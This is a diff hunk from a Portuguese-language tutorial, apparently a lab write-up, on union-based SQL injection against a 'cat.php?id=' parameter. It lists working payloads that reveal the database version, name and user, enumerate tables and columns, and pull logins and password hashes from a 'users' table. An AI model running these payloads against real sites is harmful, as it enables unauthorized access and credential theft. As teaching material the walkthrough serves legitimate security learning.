@@ -44,17 +44,17 @@ Primeiramente, vamos ver quantas colunas há no banco de dados. Para isso, vamos
 
 Logo, descobrimos que o banco de dados possui 3 colunas. Agora, vamos tentar realizar um ataque Union-based com as colunas:  
 `cat.php?id=-1 UNION SELECT 1, 2, 3--`, perceba que nenhum erro foi retornado. Dessa forma, veja o que nos é retornado com os seguintes comandos:  
-`cat.php?id=-1 UNION SELECT 1, 2, @@version--` -> 10.1.44-MariaDB-0ubuntu0.18.04.1
-`cat.php?id=-1 UNION SELECT 1, 2, database()--` -> bancocn
+`cat.php?id=-1 UNION SELECT 1, 2, @@version--` -> 10.1.44-MariaDB-0ubuntu0.18.04.1  
+`cat.php?id=-1 UNION SELECT 1, 2, database()--` -> bancocn  
 `cat.php?id=-1 UNION SELECT 1, 2, user()--` -> bancocn@localhost  
 
 Com apenas estes comandos, conseguimos a versão do banco de dados, nome e usuário.  
 Note que o ID utilizado foi um número negativo, justamente para que somente o nosso SELECT seja válido.  
 Agora, vamos explorar ainda mais a criticidade. Como o site está de fato realizando requisições diretas ao banco de dados, podemos aproveitar essa oportunidade para extrair informações sensíveis. Veja o seguinte comando:  
-`cat.php?id=-1 UNION SELECT 1,2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema="bancocn"--` -> retorna o nome das tabelas;
-`cat.php?id=-1 UNION SELECT 1,2, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name="users"--` -> retorna o nome das colunas da tabela "users";
-`cat.php?id=-1 UNION SELECT 1,2, login from users--` -> retorna o usuário do banco de dados;
-`cat.php?id=-1 UNION SELECT 1,2, password from users--` -> retorna a senha do usuário (em hash);
+`cat.php?id=-1 UNION SELECT 1,2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema="bancocn"--` -> retorna o nome das tabelas;  
+`cat.php?id=-1 UNION SELECT 1,2, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name="users"--` -> retorna o nome das colunas da tabela "users";  
+`cat.php?id=-1 UNION SELECT 1,2, login from users--` -> retorna o usuário do banco de dados;  
+`cat.php?id=-1 UNION SELECT 1,2, password from users--` -> retorna a senha do usuário (em hash);  
 
 **Nota**: O GROUP_CONCAT é essencial em ataques manuais porque ele agrupa múltiplos resultados (como todas as tabelas) em uma única string na tela. Sem ele, o servidor mostraria apenas o primeiro resultado encontrado.
 
